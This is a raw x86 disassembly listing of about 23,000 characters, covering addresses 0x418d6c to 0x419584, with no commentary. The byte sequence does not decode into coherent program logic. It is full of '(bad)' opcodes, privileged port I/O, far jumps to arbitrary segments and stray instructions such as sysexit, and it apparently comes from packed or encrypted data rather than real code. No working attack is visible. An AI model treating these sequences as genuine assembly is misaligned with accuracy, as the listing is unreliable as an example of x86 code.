  418d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d6d:	push   ss
  418d6e:	je     0x418dd9
  418d70:	xchg   edi,eax
  418d71:	int    0x29
  418d73:	xor    eax,0xf4b7f213
  418d78:	dec    ebp
  418d79:	xchg   edi,eax
  418d7a:	inc    edi
  418d7b:	aas    
  418d7c:	push   edx
  418d7d:	fisub  WORD PTR [edx+0x50]
  418d80:	jno    0x418d70
  418d82:	das    
  418d83:	loopne 0x418d8f
  418d85:	cmp    DWORD PTR [edi-0x24671903],ebp
  418d8b:	pop    eax
  418d8c:	(bad)  
  418d8d:	dec    ecx
  418d8e:	adc    eax,0x8b915294
  418d93:	adc    BYTE PTR [edi-0x2f],ch
  418d96:	push   ecx
  418d97:	out    dx,eax
  418d98:	mov    al,0xbf
  418d9a:	ror    BYTE PTR [edx],0x53
  418d9d:	inc    ecx
  418d9e:	sub    cl,ch
  418da0:	bound  edi,QWORD PTR [esi-0x76]
  418da3:	sahf   
  418da4:	loope  0x418df7
  418da6:	test   al,0xf7
  418da8:	jl     0x418d30
  418daa:	jmp    FWORD PTR [ebx]
  418dac:	jmp    0x9db8:0x6329f93
  418db3:	std    
  418db4:	push   eax
  418db5:	dec    esi
  418db6:	aad    0xa9
  418db8:	jp     0x418dc4
  418dba:	test   dh,dh
  418dbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dbd:	es test esp,ecx
  418dc0:	jb     0x418e3c
  418dc2:	dec    eax
  418dc3:	add    DWORD PTR [edx+eiz*1],0x74
  418dc7:	pop    eax
  418dc8:	adc    ebx,DWORD PTR [ecx+edx*2+0x52]
  418dcc:	jl     0x418e17
  418dce:	outs   dx,BYTE PTR ds:[esi]
  418dcf:	data16 add al,0xc8
  418dd2:	gs inc edi
  418dd4:	ja     0x418dae
  418dd6:	call   0x74c4:0x97220668
  418ddd:	lods   al,BYTE PTR ds:[esi]
  418dde:	adc    al,0xe5
  418de0:	inc    BYTE PTR [edx+eax*4]
  418de3:	inc    ecx
  418de4:	or     bh,BYTE PTR [ecx-0x2d619e01]
  418dea:	push   eax
  418deb:	lea    ebp,[ecx-0x4]
  418dee:	xchg   edx,eax
  418def:	xlat   BYTE PTR ds:[ebx]
  418df0:	daa    
  418df1:	adc    eax,0xfa9db2fd
  418df6:	xchg   ebp,eax
  418df7:	ins    BYTE PTR es:[edi],dx
  418df8:	aam    0xbd
  418dfa:	push   0x471d065e
  418dff:	cmp    BYTE PTR [esi],0x92
  418e02:	dec    ebp
  418e03:	dec    ebx
  418e04:	lock repz jle 0x418e7d
  418e08:	lahf   
  418e09:	pop    edi
  418e0a:	les    esi,FWORD PTR [ecx+0x2dd264e8]
  418e10:	sub    al,0xe3
  418e12:	test   al,0x8b
  418e14:	imul   edx,DWORD PTR [esi],0xffffffe8
  418e17:	or     al,0x25
  418e19:	mov    bh,0x21
  418e1b:	jb     0x418df9
  418e1d:	aas    
  418e1e:	jp     0x418def
  418e20:	test   eax,0x70bac6d5
  418e25:	addr16 (bad) 
  418e28:	mov    BYTE PTR [eax+0x29],bl
  418e2b:	adc    eax,0x5e0b2207
  418e30:	xchg   edx,eax
  418e31:	out    dx,eax
  418e32:	mov    esi,0x42ac48f3
  418e37:	xchg   edx,eax
  418e38:	aas    
  418e39:	rcr    DWORD PTR [ecx+0x28],1
  418e3c:	call   0xca8e83d
  418e41:	ins    DWORD PTR es:[edi],dx
  418e42:	add    al,0xc3
  418e44:	mov    bx,WORD PTR [esi*1+0x4fb74552]
  418e4c:	(bad)  
  418e4d:	mov    WORD PTR [edi+0x187365d7],ss
  418e53:	sar    BYTE PTR [eax],1
  418e55:	inc    edx
  418e56:	and    ebx,esp
  418e58:	jo     0x418e10
  418e5a:	sbb    DWORD PTR [edx-0x3c97f006],edx
  418e60:	mov    ecx,DWORD PTR [ebx-0x64]
  418e63:	and    edi,DWORD PTR [ecx]
  418e65:	jbe    0x418e6c
  418e67:	xor    esp,DWORD PTR [ecx]
  418e69:	cmp    BYTE PTR [ebx+edx*4+0x38837af7],cl
  418e70:	out    0x75,al
  418e72:	leave  
  418e73:	(bad)  
  418e74:	xchg   esp,eax
  418e75:	cld    
  418e76:	popa   
  418e77:	mov    ebx,0x601cf721
  418e7c:	jne    0x418ec7
  418e7e:	mov    ds:0x21c109b1,al
  418e83:	inc    ebp
  418e84:	jmp    0x6425:0x881e535c
  418e8b:	xchg   BYTE PTR ds:0xf42266bc,al
  418e91:	push   ecx
  418e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e93:	cmp    al,0x89
  418e95:	lea    ebx,[edi]
  418e97:	mov    bh,0x11
  418e99:	dec    ecx
  418e9a:	jmp    0x4ce3:0x9aa189d
  418ea1:	fidiv  DWORD PTR [ebx+0x2b]
  418ea4:	bound  esi,QWORD PTR [edx+0x180d8845]
  418eaa:	push   ds
  418eab:	or     eax,0xc11689cb
  418eb0:	fsubr  DWORD PTR [esi+0x47]
  418eb3:	push   cs
  418eb4:	mov    edx,0xab3d2a34
  418eb9:	inc    eax
  418eba:	sahf   
  418ebb:	(bad)  
  418ebc:	pop    eax
  418ebd:	loopne 0x418e5e
  418ebf:	(bad)  
  418ec0:	loop   0x418eee
  418ec2:	sub    DWORD PTR [ebp+0x27],esi
  418ec5:	cmp    sp,cx
  418ec8:	adc    ebx,ebp
  418eca:	fstp   TBYTE PTR [ecx-0x22aad238]
  418ed0:	mov    edx,0xba4f3cf7
  418ed5:	clc    
  418ed6:	test   BYTE PTR [edi],dl
  418ed8:	psrlw  mm5,QWORD PTR [ebp-0x7ebbad34]
  418edf:	ins    DWORD PTR es:[edi],dx
  418ee0:	jp     0x418e82
  418ee2:	in     eax,dx
  418ee3:	sub    ebx,DWORD PTR [edx-0x79]
  418ee6:	es hlt 
  418ee8:	out    dx,al
  418ee9:	xor    cl,BYTE PTR ds:0x5232cc67
  418eef:	jge    0x418e7a
  418ef1:	popf   
  418ef2:	sar    BYTE PTR [edx-0x36],cl
  418ef5:	ds adc al,0xe0
  418ef8:	cld    
  418ef9:	dec    edx
  418efa:	(bad)  
  418efb:	dec    ecx
  418efc:	retf   
  418efd:	jbe    0x418f18
  418eff:	mov    bh,bh
  418f01:	add    eax,eax
  418f03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f04:	sub    BYTE PTR [ecx],cl
  418f06:	jns    0x418ebf
  418f08:	test   DWORD PTR [bp+di],0x56599e49
  418f0f:	jmp    0xd8a9:0xaaab8a4d
  418f16:	aas    
  418f17:	push   cs
  418f18:	(bad)  
  418f1a:	mov    esp,0xa28f89d9
  418f1f:	sbb    BYTE PTR ds:0x1231fd4a,ch
  418f25:	xchg   esp,eax
  418f26:	push   edx
  418f27:	mov    ah,BYTE PTR [ebx+0x1f5937bd]
  418f2d:	pop    edx
  418f2e:	lods   al,BYTE PTR ds:[esi]
  418f2f:	ret    
  418f30:	cld    
  418f31:	out    0xc6,al
  418f33:	jle    0x418fb0
  418f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f36:	pusha  
  418f37:	stos   DWORD PTR es:[edi],eax
  418f38:	lods   al,BYTE PTR ds:[esi]
  418f39:	dec    ebx
  418f3a:	imul   ebp,edx,0x7ec8a462
  418f40:	push   esi
  418f41:	mov    ebp,0x6967dd9e
  418f46:	hlt    
  418f47:	clc    
  418f48:	test   eax,0x7bf75e07
  418f4d:	mov    ecx,0x180aef62
  418f52:	cwde   
  418f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f54:	push   cs
  418f55:	fisttp DWORD PTR [ebx+0x4b2c1102]
  418f5b:	xor    DWORD PTR [ebx],ebp
  418f5d:	and    eax,ebp
  418f5f:	mov    cl,BYTE PTR [ecx+0x52]
  418f62:	pop    ds
  418f63:	mov    ah,BYTE PTR [ecx+edx*4-0x2870d88b]
  418f6a:	pop    ds
  418f6b:	lock push esp
  418f6d:	loopne 0x418f18
  418f6f:	push   eax
  418f70:	pop    esp
  418f71:	shl    DWORD PTR [esi],cl
  418f73:	pushf  
  418f74:	out    dx,eax
  418f75:	fxch   st(4)
  418f77:	add    edi,esi
  418f79:	mov    ah,0xe1
  418f7b:	(bad)  
  418f7c:	ficom  WORD PTR [esi+0x64]
  418f7f:	cmp    edi,DWORD PTR [eax-0x151da146]
  418f85:	stos   BYTE PTR es:[edi],al
  418f86:	inc    edi
  418f87:	sbb    BYTE PTR [ecx+0x7b],0x45
  418f8b:	(bad)
  418f8e:	xchg   esp,eax
  418f8f:	mov    bh,0x9b
  418f91:	int    0x4b
  418f93:	aad    0x78
  418f95:	mov    eax,0x19ac0bb5
  418f9a:	mov    esp,0x11ec8ac7
  418f9f:	adc    ebx,DWORD PTR [eax+ebp*1]
  418fa2:	jbe    0x418f9b
  418fa4:	loope  0x418f44
  418fa6:	cmp    DWORD PTR [eax-0x77],0xffffff83
  418faa:	push   ebp
  418fab:	(bad)  
  418fac:	sbb    BYTE PTR [ecx+ebp*4+0x591495f9],ch
  418fb3:	fdivrp st(1),st
  418fb5:	or     al,0x2c
  418fb7:	mov    ah,0xb2
  418fb9:	xor    BYTE PTR [eax+0x46647166],cl
  418fbf:	jmp    0xc32e0309
  418fc4:	adc    al,0x44
  418fc6:	sbb    dh,0xe1
  418fc9:	mov    WORD PTR [esi+0x2691ff86],es
  418fcf:	or     eax,0x459b2601
  418fd4:	in     al,dx
  418fd5:	and    DWORD PTR [esi+0x6cb5bf0],edx
  418fdb:	jmp    0x418f6c
  418fdd:	mov    al,ds:0x6cb1366d
  418fe2:	or     eax,0xa2277a1f
  418fe7:	push   ebp
  418fe8:	inc    esp
  418fe9:	pop    es
  418fea:	dec    ebx
  418feb:	(bad)  
  418fec:	into   
  418fed:	mov    edi,0x3bb9192
  418ff2:	addr16 cmp ch,cl
  418ff5:	push   ds
  418ff6:	in     al,dx
  418ff7:	jp     0x41901b
  418ff9:	jae    0x418fe1
  418ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ffc:	push   edi
  418ffd:	fild   DWORD PTR [edx-0xd4e8104]
  419003:	call   0x38c6c74f
  419008:	xchg   ebx,eax
  419009:	shl    BYTE PTR [edx+ebp*8+0x7d522aaa],cl
  419010:	test   al,0xe
  419012:	in     al,dx
  419013:	test   al,0x5b
  419015:	in     al,0x7d
  419017:	inc    esi
  419018:	mov    ecx,0x2cf12500
  41901d:	in     al,0xf8
  41901f:	cmp    DWORD PTR [ebx-0x56],eax
  419022:	jecxz  0x41900d
  419024:	ror    BYTE PTR [ecx+0x1],0xe9
  419028:	imul   bh
  41902a:	icebp  
  41902b:	mov    edi,0x1778133e
  419030:	sub    ecx,esi
  419032:	xchg   edi,eax
  419033:	inc    esp
  419034:	test   DWORD PTR [edx+ecx*1-0x400e4e34],0xfa3ce4e2
  41903f:	fsubr  QWORD PTR [esi+0x5264c298]
  419045:	adc    dh,0x2e
  419048:	(bad)  
  419049:	gs sar ebx,cl
  41904c:	test   al,0x12
  41904e:	inc    esi
  41904f:	fldenv [ebx]
  419051:	call   0xdcf9cd4e
  419056:	(bad)  
  419057:	sbb    eax,0x188e8a81
  41905c:	dec    ebp
  41905d:	dec    eax
  41905e:	xchg   ebx,eax
  41905f:	int3   
  419060:	xor    ah,BYTE PTR [ecx-0x7fe40367]
  419066:	inc    edi
  419067:	xchg   esp,eax
  419068:	push   esi
  419069:	xlat   BYTE PTR ds:[ebx]
  41906a:	retf   0x7db4
  41906d:	jae    0x41901e
  41906f:	jne    0x4190ec
  419071:	push   ebp
  419072:	push   edx
  419073:	lock aam 0x2b
  419076:	pop    di
  419078:	fdivr  QWORD PTR [ecx-0x71]
  41907b:	out    0xf7,eax
  41907d:	inc    eax
  41907e:	retf   
  41907f:	rol    DWORD PTR [edx-0x7fce7d76],cl
  419085:	popf   
  419086:	(bad)  
  419087:	(bad)  
  419088:	(bad)  
  419089:	sti    
  41908a:	add    eax,0x238e7027
  41908f:	jne    0x4190cc
  419091:	idiv   DWORD PTR [ecx-0x4]
  419094:	outs   dx,DWORD PTR ds:[esi]
  419095:	imul   ebp,DWORD PTR [ecx],0x51
  419098:	mov    edi,0x7225b72f
  41909d:	shr    BYTE PTR [ebx],0x94
  4190a0:	cmp    cl,BYTE PTR ds:[ecx-0x3ec3bc20]
  4190a7:	xchg   edi,eax
  4190a8:	lea    eax,[esi-0x4ee5edf2]
  4190ae:	and    eax,0x5c2ca739
  4190b3:	leave  
  4190b4:	jge    0x419079
  4190b6:	xchg   ecx,eax
  4190b7:	jmp    0xb8f9da90
  4190bc:	cmp    BYTE PTR [ebx+0x44],0x6f
  4190c0:	mov    eax,ss
  4190c2:	inc    edi
  4190c3:	in     eax,dx
  4190c4:	xor    DWORD PTR [edi+edx*1+0x11eb1438],0xfffffff7
  4190cc:	std    
  4190cd:	lock dec esi
  4190cf:	cmc    
  4190d0:	pop    esi
  4190d1:	jp     0x419097
  4190d3:	mov    bl,0xb6
  4190d5:	pop    edx
  4190d6:	in     al,dx
  4190d7:	das    
  4190d8:	add    esp,DWORD PTR [bx+si]
  4190db:	push   eax
  4190dc:	lods   al,BYTE PTR ds:[esi]
  4190dd:	and    BYTE PTR [ebx],ch
  4190df:	js     0x4190c1
  4190e1:	(bad)  
  4190e2:	repz das 
  4190e4:	cdq    
  4190e5:	(bad)  
  4190e6:	test   al,0x55
  4190e8:	mov    BYTE PTR [edx-0x4f3557b7],cl
  4190ee:	fs into 
  4190f0:	pop    eax
  4190f1:	fdiv   st,st(2)
  4190f3:	cmp    ebp,ebp
  4190f5:	outs   dx,DWORD PTR ds:[esi]
  4190f6:	fcomip st,st(2)
  4190f8:	mov    ecx,gs
  4190fa:	sub    DWORD PTR [ebx+0x76],esp
  4190fd:	dec    ebx
  4190fe:	imul   edx,esp,0x67
  419101:	adc    ecx,esi
  419103:	and    al,0x3f
  419105:	xchg   ebp,eax
  419106:	push   ebp
  419107:	jmp    0x41910c
  419109:	aad    0xde
  41910b:	and    DWORD PTR [edx],esp
  41910d:	pop    ds
  41910e:	and    eax,0x16f2d2a6
  419113:	out    dx,al
  419114:	mov    cl,0x74
  419116:	or     BYTE PTR [ebp+0x493dc789],bh
  41911c:	int3   
  41911d:	add    ebx,DWORD PTR [edi]
  41911f:	ds (bad) 
  419121:	retf   0xfcc8
  419124:	cld    
  419125:	mov    ebp,0x42c8cff0
  41912a:	xor    DWORD PTR [ebp*4+0x4338620f],edi
  419131:	fadd   DWORD PTR [eax-0x76a4a02e]
  419137:	mov    bh,0x50
  419139:	mov    esp,0x1916e48f
  41913e:	inc    ecx
  41913f:	or     esp,DWORD PTR ds:[esi+0x4b]
  419143:	pushf  
  419144:	in     eax,dx
  419145:	loop   0x419181
  419147:	nop
  419148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419149:	xor    eax,0x8498fe39
  41914e:	inc    eax
  41914f:	mov    al,ds:0x2039f310
  419154:	mov    edi,0x143bc6c4
  419159:	pop    ss
  41915a:	dec    ebp
  41915b:	mov    edx,0x792e8928
  419160:	in     al,0x8
  419162:	xor    esi,DWORD PTR [ebp-0x3c]
  419165:	and    eax,0x23cd0294
  41916a:	int3   
  41916b:	call   0x3e2:0x1137f61
  419172:	mov    esi,0xeb4a029d
  419177:	aam    0x64
  419179:	add    eax,0xcf6d0df
  41917e:	and    cl,BYTE PTR ds:0x1edc1b90
  419184:	pusha  
  419185:	and    esi,esp
  419187:	mov    esi,0x600020f3
  41918c:	mov    eax,ds:0xa97d5e93
  419191:	fiadd  DWORD PTR [edi-0x6c8eef17]
  419197:	lods   eax,DWORD PTR ds:[esi]
  419198:	fbld   TBYTE PTR [ecx]
  41919a:	retf   
  41919b:	cwde   
  41919c:	mov    ebx,esi
  41919e:	sahf   
  41919f:	push   0x25f341c7
  4191a4:	xchg   ebp,eax
  4191a5:	fdiv   DWORD PTR [eax+0x2fbe37c7]
  4191ab:	fwait
  4191ac:	js     0x4191ba
  4191ae:	mov    ah,0x48
  4191b0:	fidivr DWORD PTR [esi-0x2dc090da]
  4191b6:	sar    DWORD PTR ss:[ebx-0x2ca57e77],cl
  4191bd:	mov    edi,0xb16ee0cd
  4191c2:	js     0x419196
  4191c4:	and    BYTE PTR [esi+0x565953c0],al
  4191ca:	cld    
  4191cb:	mov    eax,ds:0xf6558df2
  4191d0:	mov    ecx,0xdfd12ca5
  4191d5:	add    eax,0x3bf18754
  4191da:	in     al,dx
  4191db:	jle    0x419166
  4191dd:	xor    BYTE PTR [ebx],ah
  4191df:	xor    eax,0x85ccb688
  4191e4:	push   ecx
  4191e5:	leave  
  4191e6:	inc    BYTE PTR cs:0xaeb8e752
  4191ed:	dec    ebx
  4191ee:	mov    esp,0x2dd65fab
  4191f3:	(bad)  [esp+esi*1+0x7b397c0c]
  4191fa:	les    eax,FWORD PTR [edi-0x3b]
  4191fd:	xor    eax,0xce4291de
  419202:	aad    0xf8
  419204:	and    DWORD PTR [edi+0x6f],0xfcfdb230
  41920b:	(bad)  
  41920c:	sar    BYTE PTR [esi],0xc4
  41920f:	add    eax,0xfaffa628
  419214:	jmp    0x41927a
  419216:	lock rcr DWORD PTR [ebp+0x41],0xda
  41921b:	mov    ecx,DWORD PTR [edi+0x73c2e80c]
  419221:	push   ebx
  419222:	loop   0x419241
  419224:	add    BYTE PTR [ebx-0xe3f7e29],cl
  41922a:	call   0xabcf:0x905c92f2
  419231:	adc    DWORD PTR [edx-0x5127fc64],edi
  419237:	mov    esi,0xf126a4ee
  41923c:	sub    DWORD PTR [esi+0x62],esp
  41923f:	mov    WORD PTR [esi-0x41bbb922],gs
  419245:	test   al,0x35
  419247:	push   0xfffffffc
  419249:	push   ebp
  41924a:	popa   
  41924b:	mov    BYTE PTR [edi],bl
  41924d:	aaa    
  41924e:	push   edx
  41924f:	int3   
  419250:	sti    
  419251:	cmp    DWORD PTR [esi+0x73726621],eax
  419257:	hlt    
  419258:	mov    esi,0xbd4174d
  41925d:	sub    eax,0xc3bf8a57
  419262:	pop    eax
  419263:	xor    DWORD PTR [ecx-0x30f9c33a],edi
  419269:	jmp    0xd793f7d9
  41926e:	in     eax,0xb5
  419270:	test   al,0xf9
  419272:	sub    DWORD PTR [edi],esp
  419274:	or     BYTE PTR [edx+0x11],dl
  419277:	push   cs
  419278:	dec    ebp
  419279:	jns    0x41927a
  41927b:	aad    0xaa
  41927d:	stos   BYTE PTR es:[edi],al
  41927e:	add    BYTE PTR [eax],0x83
  419281:	call   0x3b37:0x5d3489c3
  419288:	adc    BYTE PTR [esi],cl
  41928a:	jl     0x419244
  41928c:	pop    edi
  41928d:	push   0x5
  41928f:	fldenv [ebp-0x424d87d0]
  419295:	mov    ds:0x4dfcd447,eax
  41929a:	gs mov ecx,0xc848b047
  4192a0:	inc    esp
  4192a1:	mov    esi,0xcd95f7c1
  4192a6:	xchg   ebx,eax
  4192a7:	jmp    0x67e0df93
  4192ac:	jbe    0x4192af
  4192ae:	jb     0x41931a
  4192b0:	jns    0x419293
  4192b2:	sub    esp,ebx
  4192b4:	xor    BYTE PTR [edi+0x7625dc54],bh
  4192ba:	add    ecx,DWORD PTR ds:0x8337b184
  4192c0:	mov    bl,0xe7
  4192c2:	out    dx,eax
  4192c3:	mov    esp,0xacb914b0
  4192c8:	test   eax,0x5c40c420
  4192cd:	dec    edi
  4192ce:	sbb    al,0xab
  4192d0:	mov    esi,0xa56cd6f
  4192d5:	add    esp,DWORD PTR [edx+0x6a2d1f8b]
  4192db:	sub    DWORD PTR [esi],ebp
  4192dd:	sub    DWORD PTR [ecx+0xc],eax
  4192e0:	(bad)  
  4192e1:	xchg   ebx,eax
  4192e2:	jle    0x419282
  4192e4:	dec    esp
  4192e5:	and    ebp,edi
  4192e7:	pop    ss
  4192e8:	(bad)  
  4192e9:	int    0xc8
  4192eb:	xchg   edi,eax
  4192ec:	or     cl,BYTE PTR [ecx-0x25b9474]
  4192f2:	mov    dh,0xb0
  4192f4:	shr    DWORD PTR [edx+0x2e],0xe6
  4192f8:	cli    
  4192f9:	jmp    0xb35450c3
  4192fe:	subps  xmm2,XMMWORD PTR [esi+ebx*8+0x11]
  419303:	test   BYTE PTR [ecx-0x5a],dl
  419306:	ins    DWORD PTR es:[edi],dx
  419307:	loopne 0x41931c
  419309:	xor    eax,0x1f52edd0
  41930e:	xchg   esp,eax
  41930f:	sub    eax,0xf7f01787
  419314:	scas   al,BYTE PTR es:[edi]
  419315:	int    0xd6
  419317:	dec    ebx
  419318:	sti    
  419319:	pop    esp
  41931a:	inc    ecx
  41931b:	mov    eax,0x461d9dae
  419320:	add    bh,BYTE PTR [eax+0x459d9db8]
  419326:	xor    al,0x2f
  419328:	add    edx,0x5b029bf9
  41932e:	xor    esp,DWORD PTR ds:0x1838654a
  419334:	jo     0x4192d7
  419336:	xchg   ah,bl
  419338:	mov    ah,0xd9
  41933a:	stc    
  41933b:	adc    eax,0x2081ccb6
  419340:	push   cs
  419341:	jmp    0x41932e
  419343:	pop    eax
  419344:	mov    ebp,0xcb024642
  419349:	inc    esi
  41934a:	sar    BYTE PTR [eax-0x52],0xfe
  41934e:	xor    DWORD PTR [ecx],0xffffffc3
  419351:	adc    esi,ebp
  419353:	mov    ah,BYTE PTR [esp+ebp*8+0x1]
  419357:	imul   ebx,DWORD PTR [edx+0x3e],0x8
  41935b:	xchg   ebp,eax
  41935c:	jg     0x4193bb
  41935e:	or     edx,DWORD PTR [edi+ebx*1-0x7c]
  419362:	and    ah,cl
  419364:	(bad)  
  419365:	jmp    0xd184:0x50c6ca38
  41936c:	pop    es
  41936d:	mov    ebx,0xb1f50107
  419372:	jae    0x41939b
  419374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419375:	call   0xe7ef:0xaf0752f6
  41937c:	cld    
  41937d:	or     DWORD PTR ds:0x41d09bab,edi
  419383:	rcl    esp,cl
  419385:	add    DWORD PTR [ebp+0x34],edx
  419388:	out    0x46,al
  41938a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41938b:	push   esi
  41938c:	pop    eax
  41938d:	mov    ds,esp
  41938f:	mov    ds:0xdf2272b4,al
  419394:	push   ebx
  419395:	lock dec esp
  419397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419398:	aad    0x15
  41939a:	hlt    
  41939b:	ret    0x40f0
  41939e:	(bad)  
  41939f:	push   esi
  4193a0:	xor    BYTE PTR [ebx-0x62],0xd9
  4193a4:	xor    DWORD PTR [esi+0x6d],esi
  4193a7:	xchg   ebp,eax
  4193a8:	mov    esi,DWORD PTR [esi]
  4193aa:	jns    0x4193b0
  4193ac:	xor    al,BYTE PTR [edx+0x68b35e5]
  4193b2:	std    
  4193b3:	lods   eax,DWORD PTR ds:[esi]
  4193b4:	add    BYTE PTR [edi-0x1e],cl
  4193b7:	adc    esi,DWORD PTR [esp+ecx*1-0x1c]
  4193bb:	xchg   esp,eax
  4193bc:	sbb    ch,dl
  4193be:	push   eax
  4193bf:	xchg   esp,eax
  4193c0:	out    dx,al
  4193c1:	mov    ebp,0x8ce28060
  4193c6:	pop    es
  4193c7:	addr16 cmp bl,dl
  4193ca:	add    eax,0x179942af
  4193cf:	mov    eax,ds:0x9659d89f
  4193d4:	mov    WORD PTR [edx],?
  4193d6:	stos   DWORD PTR es:[edi],eax
  4193d7:	push   ecx
  4193d9:	in     eax,0x54
  4193db:	xchg   edx,eax
  4193dc:	add    al,0xf6
  4193de:	pop    edi
  4193df:	mov    eax,ds:0xdc8c896e
  4193e4:	lock push ds
  4193e6:	xchg   al,dh
  4193e8:	mov    eax,0xe8b4ff21
  4193ed:	mov    ds:0xad10502d,eax
  4193f2:	sti    
  4193f3:	sbb    ah,ah
  4193f5:	sbb    DWORD PTR [edx],edi
  4193f7:	push   0x36
  4193f9:	stos   DWORD PTR es:[edi],eax
  4193fa:	fbld   TBYTE PTR [esi]
  4193fc:	adc    ch,BYTE PTR [edx+esi*4-0x61f64761]
  419403:	lods   al,BYTE PTR ds:[esi]
  419404:	es cmc 
  419406:	and    DWORD PTR [ebp-0xd],ecx
  419409:	xchg   esi,esp
  41940b:	pop    esp
  41940c:	cmp    eax,0x504c78b3
  419411:	fiadd  DWORD PTR [esi]
  419413:	call   0x5aa:0x7a085323
  41941a:	xor    bl,BYTE PTR [esi-0x22025986]
  419420:	xor    eax,0x50b77297
  419425:	arpl   ax,cx
  419427:	sar    BYTE PTR [esi],1
  419429:	cmc    
  41942a:	jmp    0x419405
  41942c:	call   0xdb84:0x42bd5379
  419433:	clc    
  419434:	gs push ss
  419436:	sti    
  419437:	xor    BYTE PTR [esi+eiz*1+0x33],al
  41943b:	in     eax,0xb7
  41943d:	dec    ebx
  41943e:	sub    DWORD PTR [edx+esi*1-0x2e],ebp
  419442:	inc    edx
  419443:	outs   dx,BYTE PTR ds:[esi]
  419444:	inc    esp
  419445:	xchg   ecx,eax
  419446:	cmp    DWORD PTR [esi+ecx*2+0x5d],esp
  41944a:	push   ebp
  41944b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41944c:	jmp    0x4193e5
  41944e:	stos   BYTE PTR es:[edi],al
  41944f:	into   
  419450:	xchg   edx,eax
  419451:	lods   eax,DWORD PTR ds:[esi]
  419452:	lahf   
  419453:	lods   eax,DWORD PTR ds:[esi]
  419454:	sub    esp,DWORD PTR [esi+0x74e42523]
  41945a:	jp     0x41942a
  41945c:	add    eax,0xb9b2d6da
  419461:	xchg   edi,eax
  419462:	xor    BYTE PTR [esi-0x6a],0x4e
  419466:	fnstenv [eax-0x8]
  419469:	das    
  41946a:	jbe    0x419440
  41946c:	or     DWORD PTR [edi+0x2b],edi
  41946f:	adc    ch,BYTE PTR [edi+ebp*1-0x4]
  419473:	sbb    dh,cl
  419475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419476:	fstp   QWORD PTR [esi-0x1f]
  419479:	dec    esi
  41947a:	mov    esp,0x81f6dfbb
  41947f:	fwait
  419480:	sbb    BYTE PTR [eax+0x49fc18a7],dh
  419486:	stc    
  419487:	sub    ch,bh
  419489:	cmp    esp,ebx
  41948b:	icebp  
  41948c:	nop
  41948d:	imul   edx,esp,0x47
  419490:	dec    edx
  419491:	mov    ch,dl
  419493:	(bad)  
  419494:	pushf  
  419495:	cwde   
  419496:	mov    edx,0xf89c2e06
  41949b:	inc    DWORD PTR [esp+ecx*8-0x4]
  41949f:	jbe    0x4194da
  4194a1:	jns    0x4194b6
  4194a3:	xor    dh,0x2
  4194a6:	add    dh,BYTE PTR ds:0x87d4a28b
  4194ac:	push   edi
  4194ad:	(bad)  
  4194ae:	je     0x41949a
  4194b0:	ret    
  4194b1:	fwait
  4194b2:	into   
  4194b3:	mov    ?,esp
  4194b5:	jmp    0x419437
  4194b7:	outs   dx,BYTE PTR ds:[esi]
  4194b8:	mov    dl,0xd1
  4194ba:	dec    edx
  4194bb:	sbb    al,0xc5
  4194bd:	shr    DWORD PTR [edx+edx*4+0x22],0xdc
  4194c2:	in     al,0xfc
  4194c4:	or     DWORD PTR [eax],ebp
  4194c6:	xchg   edi,eax
  4194c7:	or     al,0x89
  4194c9:	add    al,0xa7
  4194cb:	push   cs
  4194cc:	popf   
  4194cd:	cwde   
  4194ce:	xor    esi,DWORD PTR [edx]
  4194d0:	ret    0x2492
  4194d3:	sub    BYTE PTR [ecx+0x3901b1e2],dh
  4194d9:	pop    es
  4194da:	std    
  4194db:	mov    eax,ds:0x1aba4c77
  4194e0:	or     eax,0x8bd25892
  4194e5:	adc    BYTE PTR [edx],bl
  4194e7:	xor    cl,ch
  4194e9:	sbb    DWORD PTR [ebp-0x50],0x30
  4194ed:	test   DWORD PTR [ecx+0x67],0x66a80c60
  4194f4:	outs   dx,BYTE PTR ds:[esi]
  4194f5:	cmc    
  4194f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194f7:	lock sysexit 
  4194fa:	fnstcw WORD PTR [ebx]
  4194fc:	jmp    0x4194d0
  4194fe:	inc    edx
  4194ff:	mov    esp,0xbf4955b5
  419504:	into   
  419505:	ja     0x419500
  419507:	(bad)
  41950a:	repz cmp DWORD PTR [ebp-0x7c],ebp
  41950e:	mov    ah,0x7b
  419510:	pop    ds
  419511:	push   esi
  419512:	mov    ebp,0xc04ebd0e
  419517:	cmp    al,0x62
  419519:	jecxz  0x4194a2
  41951b:	shl    DWORD PTR [ecx-0x519dcdae],cl
  419521:	push   ebx
  419522:	xor    DWORD PTR [eax+0xcf6ad58],ebp
  419528:	out    0x85,al
  41952a:	neg    BYTE PTR [ebx-0x63dac3f7]
  419530:	mov    ecx,0xe155559a
  419535:	or     dl,BYTE PTR [ebp*1-0x6019a20d]
  41953c:	jmp    0x419551
  41953e:	dec    esp
  41953f:	(bad)  
  419540:	sub    edx,eax
  419542:	adc    al,0xd
  419544:	pop    esp
  419545:	inc    esi
  419546:	popf   
  419547:	(bad)  
  419548:	retf   0xc105
  41954b:	mov    BYTE PTR [ecx],dl
  41954d:	inc    esp
  41954e:	or     al,0x6
  419550:	mov    esp,0x7f384df2
  419555:	neg    bl
  419557:	imul   ecx,ebp,0xea915f64
  41955d:	jo     0x4195c9
  41955f:	je     0x419579
  419561:	data16 mov WORD PTR [ecx+edx*1-0x79a1c3ff],ds
  419569:	aas    
  41956a:	jne    0x41951b
  41956c:	repz jge 0x419512
  41956f:	jne    0x41958c
  419571:	and    ebp,DWORD PTR [edx-0x106d3622]
  419577:	mov    ecx,0x885cc7a6
  41957c:	aaa    
  41957d:	jecxz  0x419526
  41957f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419580:	or     al,0xfa
  419582:	test   al,0x30
  419584:	arpl   WORD PTR [eax+0x577acc4],si
